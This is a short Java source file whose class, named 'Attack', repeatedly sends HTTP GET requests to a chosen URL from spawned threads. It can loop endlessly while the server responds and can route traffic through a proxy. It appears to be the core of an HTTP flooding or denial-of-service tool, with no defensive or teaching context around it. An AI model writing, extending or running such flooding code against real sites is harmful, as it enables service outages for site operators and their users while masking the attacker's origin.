import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;

public class Attack {

    private static String GET_URL;

    public static Proxy proxy;

    public static int statusCode;

    public void setUrl(String url){
        GET_URL = url;
    }

    public void setProxy(String ip, int port){
        this.proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(ip, port));
    }

    public static int sendGET() throws IOException {
        URL obj = new URL(GET_URL);
        HttpURLConnection con;

        if(proxy != null) {
            con = (HttpURLConnection) obj.openConnection(proxy);
        }else{
            con = (HttpURLConnection) obj.openConnection();
        }

        con.setRequestMethod("GET");

        int responseCode;
        responseCode = con.getResponseCode();

        return responseCode;
    }

    public static void sendGetThread(int times, String url){
        //try create a thread. if threads are end, finish thread creating
        try {
            //create new thread
            new Thread(() -> {
                //try to send GET request
                try {
                    // send GET request infinity, or setted time
                    if (times == 0) {
                        while (true) {
                            statusCode = sendGET();
                            System.out.println(url + " : " + statusCode + " : " + proxy);
                            if (statusCode != 200){
                                break;
                            }
                        }
                    }
                    else {
                        for (int i = 0; i < times; i++) {
                            statusCode = sendGET();
                            System.out.println(url + " : " + statusCode + " : " + proxy);
                            if (statusCode != 200){
                                break;
                            }
                        }
                    }
                } catch (IOException e) {
                    return;
                }

            }).start();
        }catch (Exception e){
            return;
        }
        return;
    }

}
